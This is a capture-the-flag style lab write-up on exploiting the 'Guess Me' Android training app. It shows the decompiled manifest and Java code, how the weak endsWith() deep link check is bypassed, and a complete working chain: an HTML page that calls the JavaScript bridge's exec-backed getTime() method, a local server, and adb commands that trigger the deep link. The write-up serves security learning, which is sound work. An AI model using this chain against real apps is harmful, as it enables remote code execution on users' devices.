## Overview:~#
The objective of this lab is to exploit a deep link vulnerability in the "Guess Me" Android application to achieve Remote Code Execution (RCE). 
 
---
 
## Static Analysis:~#
 
I started by decompiling the APK with **jadx-gui** to get a clear picture of what the app is doing under the hood.
 
The first place I always look is `AndroidManifest.xml` — it tells you what's exported, what's accessible, and what attack surface exists before you even touch the Java code.
 
<img width="1599" height="833" alt="image" src="https://github.com/user-attachments/assets/64981364-6c0f-4296-9ad9-242715b821d2" />

 
Three things immediately caught my eye:
 
```xml
<activity
    android:name="com.mobilehackinglab.guessme.WebviewActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data
            android:scheme="mhl"
            android:host="mobilehackinglab"/>
    </intent-filter>
</activity>
```
 
`WebviewActivity` is exported and registers a custom deep link scheme — `mhl://mobilehackinglab`. The `BROWSABLE` category means this activity can be triggered externally, from a browser, another app, or straight from `adb`. That's already interesting.
 
---
 
## Digging Into WebviewActivity:~#
 
I navigated to `WebviewActivity.java` in jadx and started reading through the logic.
 
<img width="1252" height="769" alt="image" src="https://github.com/user-attachments/assets/4b73653f-f110-4b62-a373-13c3d7bcd4e4" />

 
The `onCreate()` sets up a WebView with JavaScript enabled and registers a JavaScript interface called `AndroidBridge`:
 
```java
webSettings.setJavaScriptEnabled(true);
webView.addJavascriptInterface(new MyJavaScriptInterface(), "AndroidBridge");
```
 
JavaScript enabled + a custom JS bridge? Already suspicious. I kept reading.
 
### The Validation Function:~#
 
When a deep link comes in, it hits `isValidDeepLink()` before anything loads:
 
```java
private final boolean isValidDeepLink(Uri uri) {
    if ((!Intrinsics.areEqual(uri.getScheme(), "mhl") && 
         !Intrinsics.areEqual(uri.getScheme(), "https")) || 
         !Intrinsics.areEqual(uri.getHost(), "mobilehackinglab")) {
        return false;
    }
    String queryParameter = uri.getQueryParameter("url");
    return queryParameter != null && 
           StringsKt.endsWith$default(queryParameter, "mobilehackinglab.com", false, 2, null);
}
```
 
It checks:
1. Scheme must be `mhl` or `https`
2. Host must be `mobilehackinglab`
3. The `url` query parameter must **end with** `mobilehackinglab.com`
That third check is where it falls apart. `endsWith()` only looks at the tail of the string which means it doesn't validate that the URL is actually *on* that domain. That means a domain like `attacker.testmobilehackinglab.com` passes the check perfectly, and I control that domain.
 
If validation passes, `loadDeepLink()` runs:
 
```java
private final void loadDeepLink(Uri uri) {
    String fullUrl = String.valueOf(uri.getQueryParameter("url"));
    webView.loadUrl(fullUrl);
    webView.reload();
}
```
 
The `url` parameter is loaded directly into the WebView. No sanitization, no allowlist, nothing.
 
### The RCE Sink:~#
 
Then I looked at `MyJavaScriptInterface`, specifically the `getTime()` method:
 
```java
@JavascriptInterface
public final String getTime(String Time) {
    try {
        Process process = Runtime.getRuntime().exec(Time);
        InputStream inputStream = process.getInputStream();
        // reads output and returns it
        return text;
    } catch (Exception e) {
        return "Error getting time";
    }
}
```
 
This is it. `getTime()` takes a string and passes it directly to `Runtime.getRuntime().exec()` — then returns the output back to JavaScript. And since it's decorated with `@JavascriptInterface`, any page loaded in the WebView can call it via `AndroidBridge.getTime("command here")`.
 
The full exploit chain was clear at this point:
 
```
mhl://mobilehackinglab?url=http://attacker.testmobilehackinglab.com
         │
         ▼
  endsWith("mobilehackinglab.com") — bypass!
         │
         ▼
  WebView loads my attacker-controlled page
         │
         ▼
  JavaScript calls AndroidBridge.getTime("id")
         │
         ▼
  Runtime.exec("id") → output returned to JS → RCE
```

## Setting Up the Exploit:~#
 
Since I don't have a real domain, I served the malicious page locally and used `adb reverse` to tunnel the emulator's traffic back to my machine.
 
### 1. Creating the malicious page
 
```html
<html>
<body>
<script>
    window.onload = function() {
        var result = AndroidBridge.getTime("id");
        document.body.innerHTML = result;
    };
</script>
</body>
</html>
```
 
I saved this as `index.html` inside a directory named `testmobilehackinglab.com` so the path itself satisfies the `endsWith()` check, and Python serves `index.html` with the correct `Content-Type: text/html` when the folder is requested:
 
```bash
~> /poc python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...

```
 
### 2. Tunneling from the emulator to my host
 
```bash
~> /poc adb reverse tcp:8080 tcp:8080
~> /poc adb reverse --list           
```

### 3. Triggering the deep link
 
```bash
adb shell am start -a android.intent.action.VIEW -d "mhl://mobilehackinglab?url=http://127.0.0.1:8080/testmobilehackinglab.com/"
```
